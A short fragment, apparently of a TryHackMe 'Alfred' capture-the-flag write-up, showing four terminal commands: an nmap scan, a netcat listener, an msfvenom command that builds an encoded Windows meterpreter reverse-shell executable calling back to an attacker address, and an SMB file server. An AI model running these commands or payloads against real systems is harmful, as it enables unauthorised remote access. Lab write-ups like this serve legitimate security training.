...
```
bibo318@parrot:~/CTFs/tryhackme/Alfred$ sudo nmap -A -sS -sC -sV -O -Pn 10.10.176.61
...
```
bibo318@parrot:~/CTFs/tryhackme/Alfred$ nc -lnvp 9001
...
```
bibo318@parrot:~/CTFs/tryhackme/Alfred$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.8.106.222 LPORT=9002 -f exe -o win_revshell.exe
...
```
bibo318@parrot:~/CTFs/tryhackme/Alfred$ sudo smbserver.py smbfolder .
